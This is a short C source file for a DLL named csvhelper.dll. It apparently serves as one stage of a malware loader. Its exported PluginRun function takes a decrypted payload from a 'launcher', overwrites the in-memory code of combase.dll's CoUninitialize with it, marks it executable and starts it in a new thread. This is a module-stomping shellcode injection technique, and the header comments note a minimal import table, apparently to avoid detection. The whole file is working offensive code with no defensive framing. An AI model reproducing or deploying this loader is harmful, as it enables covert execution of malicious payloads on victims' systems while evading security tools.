/*
 * plugin.c — csvhelper.dll: combase.dll slot loader
 *
 * Exports PluginRun(plaintext, len) — launcher passes the decrypted PICO,
 * plugin copies it into combase!CoUninitialize, flips RX, spawns thread,
 * returns the thread HANDLE (NULL on any failure).
 *
 * IAT: kernel32 only — LoadLibraryA, GetProcAddress, VirtualProtect,
 * CreateThread. No bcrypt, no advapi32, no filesystem.
 */

#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(hinst);
    return TRUE;
}

__declspec(dllexport) HANDLE WINAPI PluginRun(const void *pt, SIZE_T len)
{
    HMODULE mod = LoadLibraryA("combase.dll");
    if (!mod) return NULL;

    void *slot = (void *)GetProcAddress(mod, "CoUninitialize");
    if (!slot) return NULL;

    DWORD old;
    if (!VirtualProtect(slot, len, PAGE_READWRITE, &old))
        return NULL;

    memcpy(slot, pt, len);

    if (!VirtualProtect(slot, len, PAGE_EXECUTE_READ, &old))
        return NULL;

    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)slot, NULL, 0, NULL);
}
